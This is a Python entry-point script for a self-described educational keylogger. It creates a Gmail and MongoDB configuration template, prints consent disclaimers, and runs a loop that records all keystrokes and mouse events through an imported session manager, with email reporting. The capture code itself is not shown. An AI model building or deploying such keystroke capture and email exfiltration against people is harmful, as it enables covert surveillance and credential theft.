"""
KeyLogger Application - Main Entry Point
Educational keylogger for learning system monitoring and input tracking

This application demonstrates:
- Low-level input event capture (mouse, keyboard)
- Pattern analysis in user behavior
- Database storage integration
- Email reporting systems
- Session management and idle detection

WARNING: This is for educational use only on your own device.
Unauthorized monitoring of others is illegal.
"""

import logging
import sys
from session_manager import SessionManager
from datetime import datetime
import os

# Configure logging
logging.basicConfig(
    filename='keylogger.log',
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


def setup_environment():
    """Check and setup required environment variables"""
    print("\n" + "="*60)
    print("KeyLogger Setup - Educational Monitoring Tool")
    print("="*60)

    # Check for .env file
    if not os.path.exists('.env'):
        print("\n[!] .env file not found!")
        print("[*] Creating template .env file...")

        env_template = """# KeyLogger Configuration
# Gmail Configuration for email reports
EMAIL_PASSWORD=your_gmail_app_password_here

# MongoDB Configuration (optional, defaults to localhost:27017)
MONGODB_HOST=localhost
MONGODB_PORT=27017

# Note: To get a Gmail app password:
# 1. Go to https://myaccount.google.com/security
# 2. Enable 2-Factor Authentication if not enabled
# 3. Go to App passwords and generate a new one
# 4. Copy the password here
"""

        with open('.env', 'w') as f:
            f.write(env_template)

        print("[+] .env template created!")
        print("[!] Please edit .env and add your Gmail app password")
        print("[!] Then run the program again")
        return False

    # Check for email password
    from dotenv import load_dotenv
    load_dotenv()
    email_password = os.getenv('EMAIL_PASSWORD', '')

    if not email_password or email_password == 'your_gmail_app_password_here':
        print("\n[!] Email password not configured properly")
        print("[*] Email reports will be skipped")
        return True  # Still allow to run, but without email

    return True


def display_welcome():
    """Display welcome message and disclaimers"""
    print("\n" + "="*60)
    print("EDUCATIONAL KEYLOGGER")
    print("="*60)

    print("\n[!] IMPORTANT DISCLAIMER:")
    print("    This tool is for EDUCATIONAL PURPOSES ONLY")
    print("    Use only on YOUR OWN device with YOUR CONSENT")
    print("    Unauthorized monitoring is ILLEGAL")

    print("\nThis application captures:")
    print("  • Keyboard input (all keys pressed)")
    print("  • Mouse movements (direction changes)")
    print("  • Mouse clicks (button presses)")
    print("  • Behavioral patterns and typing speed")

    print("\nData is stored to:")
    print("  • MongoDB database (if available)")
    print("  • Local backup files (if DB unavailable)")
    print("  • Email reports (if configured)")

    print("\n[*] Starting session management...")
    print("-" * 60)


def main():
    """Main entry point"""
    try:
        # Setup and validate environment
        if not setup_environment():
            return

        # Display welcome and disclaimers
        display_welcome()

        # Initialize session manager
        session = SessionManager()

        # Start session
        session.start_session()

        # Activity monitoring loop
        print("[*] Monitoring user activity...")
        print("[*] Press Ctrl+C to end session manually\n")

        try:
            while session.session_active:
                # Periodically check for events and update activity
                import time
                time.sleep(0.1)

                # Check if there are recent events to update activity tracker
                mouse_events = session.mouse_tracker.get_events()
                keyboard_events = session.keyboard_tracker.get_events()

                if mouse_events or keyboard_events:
                    session.record_activity()

        except KeyboardInterrupt:
            print("\n\n[*] Received interrupt signal...")
            session.end_session()

        # Cleanup
        session.cleanup()
        print("[+] KeyLogger stopped cleanly")

    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == '__main__':
    main()
